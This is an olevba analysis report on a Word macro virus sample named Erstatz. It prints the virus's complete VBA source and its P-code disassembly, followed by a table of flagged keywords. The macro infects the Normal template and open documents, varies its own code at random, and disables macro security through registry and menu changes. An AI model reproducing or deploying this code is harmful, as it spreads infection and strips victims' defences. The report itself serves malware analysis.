olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Erstatz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Erstatz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'
'Erstatz v1.0
On Error Resume Next
GoTo setup
infekt:
Set nrmal = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set aktiv = ActiveDocument.VBProject.VBComponents(1).CodeModule
If nrmal.lines(2, 1) <> "'" Then
nrmal.deletelines 1, nrmal.countoflines
'
nrmal.insertlines 2, aktiv.lines(2, aktiv.countoflines)
nrmal.insertlines 1, "Sub Document_Close()"
'
For n = 9 To nrmal.countoflines
Randomize
ma = Int((Rnd * 4) + 1)
'
If nrmal.lines(n, 1) = "'" And ma >= 2 Then
nrmal.deletelines n, 1
'
'
'
je = je + 1
If je = 15 Then GoTo ausgang
'
End If
Next n
End If
'
'
ausgang:
'
'
'
If aktiv.lines(2, 1) <> "'" Then
'
'
'
'
aktiv.deletelines 1, aktiv.countoflines
aktiv.insertlines 2, nrmal.lines(2, nrmal.countoflines)
aktiv.insertlines 1, "Sub Document_Open()"
For i = 9 To aktiv.countoflines
Randomize
ma = Int((Rnd * 4) + 1)
If ma <= 2 Then
aktiv.insertlines i, "'"
End If
Next i
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
End If
GoTo done
setup:
Options.SaveNormalPrompt = False
Options.SendMailAttach = True
Options.ConfirmConversions = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = False
End If
GoTo infekt:
done:
End Sub
        




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Erstatz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8356 bytes
' Line #0:
' 	FuncDefn (Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x000C "Erstatz v1.0"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	GoTo setup 
' Line #5:
' 	Label infekt 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nrmal 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set aktiv 
' Line #8:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nrmal 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld nrmal 
' 	MemLd countoflines 
' 	Ld nrmal 
' 	ArgsMemCall deletelines 0x0002 
' Line #10:
' 	QuoteRem 0x0000 0x0000 ""
' Line #11:
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	Ld aktiv 
' 	MemLd countoflines 
' 	Ld aktiv 
' 	ArgsMemLd lines 0x0002 
' 	Ld nrmal 
' 	ArgsMemCall insertlines 0x0002 
' Line #12:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld nrmal 
' 	ArgsMemCall insertlines 0x0002 
' Line #13:
' 	QuoteRem 0x0000 0x0000 ""
' Line #14:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0009 
' 	Ld nrmal 
' 	MemLd countoflines 
' 	For 
' Line #15:
' 	ArgsCall Read 0x0000 
' Line #16:
' 	Ld Rnd 
' 	LitDI2 0x0004 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St ma 
' Line #17:
' 	QuoteRem 0x0000 0x0000 ""
' Line #18:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Ld nrmal 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Ld ma 
' 	LitDI2 0x0002 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #19:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Ld nrmal 
' 	ArgsMemCall deletelines 0x0002 
' Line #20:
' 	QuoteRem 0x0000 0x0000 ""
' Line #21:
' 	QuoteRem 0x0000 0x0000 ""
' Line #22:
' 	QuoteRem 0x0000 0x0000 ""
' Line #23:
' 	Ld je 
' 	LitDI2 0x0001 
' 	Add 
' 	St je 
' Line #24:
' 	Ld je 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ausgang 
' 	EndIf 
' Line #25:
' 	QuoteRem 0x0000 0x0000 ""
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x0000 ""
' Line #30:
' 	QuoteRem 0x0000 0x0000 ""
' Line #31:
' 	Label ausgang 
' Line #32:
' 	QuoteRem 0x0000 0x0000 ""
' Line #33:
' 	QuoteRem 0x0000 0x0000 ""
' Line #34:
' 	QuoteRem 0x0000 0x0000 ""
' Line #35:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld aktiv 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Ne 
' 	IfBlock 
' Line #36:
' 	QuoteRem 0x0000 0x0000 ""
' Line #37:
' 	QuoteRem 0x0000 0x0000 ""
' Line #38:
' 	QuoteRem 0x0000 0x0000 ""
' Line #39:
' 	QuoteRem 0x0000 0x0000 ""
' Line #40:
' 	LitDI2 0x0001 
' 	Ld aktiv 
' 	MemLd countoflines 
' 	Ld aktiv 
' 	ArgsMemCall deletelines 0x0002 
' Line #41:
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	Ld nrmal 
' 	MemLd countoflines 
' 	Ld nrmal 
' 	ArgsMemLd lines 0x0002 
' 	Ld aktiv 
' 	ArgsMemCall insertlines 0x0002 
' Line #42:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	Ld aktiv 
' 	ArgsMemCall insertlines 0x0002 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0009 
' 	Ld aktiv 
' 	MemLd countoflines 
' 	For 
' Line #44:
' 	ArgsCall Read 0x0000 
' Line #45:
' 	Ld Rnd 
' 	LitDI2 0x0004 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St ma 
' Line #46:
' 	Ld ma 
' 	LitDI2 0x0002 
' 	Le 
' 	IfBlock 
' Line #47:
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld aktiv 
' 	ArgsMemCall insertlines 0x0002 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	GoTo done 
' Line #53:
' 	Label setup 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #55:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SendMailAttach 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #57:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #58:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #59:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #60:
' 	ElseBlock 
' Line #61:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #62:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	GoTo infekt 
' 	BoS 0x0000 
' Line #65:
' 	Label done 
' Line #66:
' 	EndSub 
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

